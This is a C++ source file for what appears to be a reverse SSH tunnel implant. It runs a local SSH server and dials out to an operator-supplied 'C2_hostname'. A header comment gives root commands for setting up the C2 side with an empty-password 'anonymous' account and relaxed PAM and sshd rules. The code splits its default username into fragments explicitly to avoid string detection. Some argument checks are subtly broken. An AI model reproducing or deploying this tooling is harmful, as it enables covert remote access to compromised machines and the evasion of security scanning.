#define LIBSSH_STATIC 1

#include <libssh/libssh.h>
#include <stdlib.h>
#include <stdio.h>
#include <thread>
#include <string.h>

#include "server.h"
#include "client.h"
#include "global.h"

/* Run all of this as root
Create a new user:
adduser --disabled-password anonymous

Disable his shell
usermod -s /bin/false anonymous

Make the password actually empty:
sed -i -re 's/^anonymous:[^:]+:/anonymous::/' /etc/passwd /etc/shadow

Allow blank passwords for SSH sessions in PAM: edit /etc/pam.d/sshd and replace the line that reads @include common-auth with:
auth [success=1 default=ignore] pam_unix.so nullok
auth requisite pam_deny.so
auth required pam_permit.so

Allow blank passwords for SSH sessions of anonymous in /etc/ssh/sshd_config:
PermitEmptyPasswords yes

Restart sshd:
systemctl restart ssh
*/

void help(char* self) {
    debug("Usage: %s [user@C2_hostname [LOCAL_SSH_SERVER_PORT]\n", self);
    debug("Example: %s user@C2_hostname\n", self);
    debug("Example: %s user@C2_hostname 1234\n", self);  
    debug("Example: %s -t 16909060\n", self);
    debug("Example: %s hostname\n", self);
    debug("Defaults: user is `anonymous` and LOCAL_SSH_SERVER_PORT is 2222\n");
    exit(1);
}

void integer_to_ip(int ip, char* result) {
    unsigned char bytes[4];
    bytes[0] = ip & 0xFF;
    bytes[1] = (ip >> 8) & 0xFF;
    bytes[2] = (ip >> 16) & 0xFF;
    bytes[3] = (ip >> 24) & 0xFF;
    snprintf(result, 15, "%d.%d.%d.%d", bytes[3], bytes[2], bytes[1], bytes[0]);
}

void parse_args(int argc, char** argv,
    char* C2_host,
    int* ssh_server_port_int,
    char* username) {

    char* ptr;
    char* C2_port = NULL;
    char* ssh_server_port = NULL;
    if (argc < 2 || argc > 3) {
        help(argv[0]);
    }

    /* integer IP*/
    if (argc == 3 && memcmp(argv[1], "-t", 2) == 0) {
        unsigned long ip_integer = strtoul(argv[2], NULL, 10);
        if (ip_integer == NULL) {
            help(argv[0]);
        }
        integer_to_ip(ip_integer, C2_host);
        return;
    }

    ptr = strchr(argv[1], '@');
    if (ptr != NULL){
        ptr[0] = '\0';
        strncpy(username, argv[1], 100);
        strncpy(C2_host, ptr + 1,  255);
    }
    else {
        strncpy(C2_host, argv[1], 255);
    }

    if (argc == 3) {
        ssh_server_port = argv[2];
        *ssh_server_port_int = atoi(ssh_server_port);
        if (ssh_server_port_int == 0) {
            help(argv[0]);
        }
    }

    if (C2_host[0] == '0') {
        help(argv[0]);
    }
    
}

int main(int argc, char** argv){
    char* C2_port = NULL;    
    char C2_host[256] = {0};
    char* ssh_server_port = NULL;
    int ssh_server_port_int = 2222;
    char username[101] = {0};

    // default user, splitted to avoid strings detection
    strncat(username, "ano", 100); 
    strncat(username, "nym", 100);
    strncat(username, "ous", 100);

    
    parse_args(argc, argv, C2_host, &ssh_server_port_int, username);

    ssh_init(); // mandatory

    // Server
    auto server = SSHServer();
    std::thread server_thread(server.run, ssh_server_port_int);

    std::this_thread::sleep_for(std::chrono::seconds(1));

    // Client
    auto client = SSHClient();
    std::thread client_thread(client.run, username, C2_host, ssh_server_port_int);

    server_thread.join();

    client.should_terminate = 1;
    client_thread.join();

	ssh_finalize();

    return 0;
}